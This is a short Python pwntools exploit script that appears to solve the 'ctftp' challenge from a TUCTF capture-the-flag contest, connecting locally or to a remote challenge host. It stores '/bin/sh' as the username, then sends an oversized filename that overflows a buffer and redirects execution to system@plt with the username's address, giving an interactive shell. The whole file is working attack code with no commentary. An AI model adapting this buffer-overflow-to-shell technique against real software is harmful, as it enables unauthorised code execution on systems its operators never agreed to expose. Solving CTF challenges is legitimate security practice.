from pwn import *
import sys

system_plt = 0x80490b0
main = 0x08049709
username_add = 0x804c080 

if len(sys.argv) < 2:
	r = process('./ctftp')
else:
	host, port = "chal.tuctf.com", 30500
	r = remote(host, port)

raw_input('debug')

r.recvuntil('your name: ')
r.sendline('/bin/sh')
r.recvuntil('> ')
r.sendline('2')
r.recvuntil('filename: ')
buf = 'ctftp\x00'
buf += 'a'*0x46
buf += p32(system_plt)
buf += 'aaaa'
buf += p32(username_add)
r.sendline(buf)

r.interactive()
r.close()